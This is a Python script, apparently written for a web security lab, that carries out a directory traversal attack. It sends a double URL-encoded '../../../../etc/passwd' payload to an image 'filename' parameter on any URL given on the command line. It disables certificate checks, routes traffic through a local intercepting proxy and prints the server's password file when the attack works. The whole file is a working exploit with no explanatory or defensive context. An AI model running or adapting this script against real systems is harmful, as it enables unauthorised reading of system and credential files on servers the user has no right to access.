import sys
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def directory_traversal(url):
    payload = urllib.parse.quote("../../../../etc/passwd",safe='') #Encode the string with no characters considered safe. - All characters will be encoded.
    payload = urllib.parse.quote(payload,safe='')
    img_url = url + "/image?filename=" +payload
    r = requests.get(img_url,verify=False,proxies=proxies)
    if "root:" in r.text:
        print("✅ Exploit was successful")
        print("✅ The following is the content of the etc/passwd file:")
        print(r.text)
    else:
        print("❌ Exploit failed")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("⚠️  Usage: %s <url>" % sys.argv[0])
        print("⚠️  Example: www.example.com")
        sys.exit(-1)
    url = sys.argv[1]
    directory_traversal(url)


if __name__ == "__main__":
    main()